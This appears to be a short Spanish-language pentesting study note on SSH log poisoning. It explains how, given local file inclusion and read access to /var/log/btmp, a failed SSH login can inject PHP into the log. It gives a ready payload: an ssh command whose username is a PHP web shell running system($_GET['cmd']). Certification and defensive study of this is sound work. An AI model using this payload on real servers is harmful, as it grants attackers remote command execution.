De la misma manera que el log poisoning de apache, si disponeos de LFI, y tenemos permiso de lectura para ver los logs. 

Podríamos intentar hacer una conexión ssh (aún sin conocer la contraseña, da igual). Y esta conexión quedaría almacenada en el log. de manera que si inyectamos código php 'entre comillas simples' en el campo de usuario y luego consultamos el log desde la web, nos interpretaría el código.

# Fichero log
```
/var/log/btmp
```

# Conexión ssh envenenada

si en lugar de poner ```ssh usuario@ip```

ponemos: 
```
ssh '<?php system('$_GET["cmd"]'); ?>'@172.10.0.3
```

el log quedaría envenenado, y al consultar el log a través del LFI en el navegador, este código se vería interpretado.
<img src="https://raw.githubusercontent.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/main/images/logpssh1.png" /> 


